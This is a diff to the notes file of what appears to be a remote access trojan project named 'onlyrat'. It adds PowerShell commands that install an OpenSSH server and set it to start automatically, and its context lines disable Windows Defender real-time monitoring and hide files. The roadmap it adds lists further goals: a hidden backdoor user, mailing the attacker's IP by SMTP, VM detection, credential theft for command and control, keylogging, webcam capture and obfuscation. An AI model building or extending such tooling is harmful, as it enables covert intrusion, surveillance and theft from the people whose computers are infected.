@@ -27,6 +27,15 @@ attrib -h -s -r FILE
 attrib +h +s +r FILE
 ```
 
+## ssh
+```
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+Get-NetFirewallRule -Name *ssh*
+
+```
+
 ## exclusion path
 ```
 Set-MpPreference -DisableRealtimeMonitoring true
@@ -62,14 +71,23 @@ Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\C
 - custom uploads
 
 ## Roadmap:
+- finish advanced staging for remote connection
+	- smtp workflow
+		- send attacker ip
+	- hide onlyrat user
+	- reconnaissance scan
+		- ip addr for ssh
+		- smtp results
+	- vm detection [wait]
 - establish attacker console
 	- python
-- send commands back and forth
-	- taget pc to host socket
-- have rat create backdoor
+	- send commands back and forth [ssh]
+	- modular interface
+
 - vbs special folders
 - redevelop keylogger
 - screenshots
+- get base user creds for more advanced C2
 - webcam
 - obtaining credential
 - obfuscation
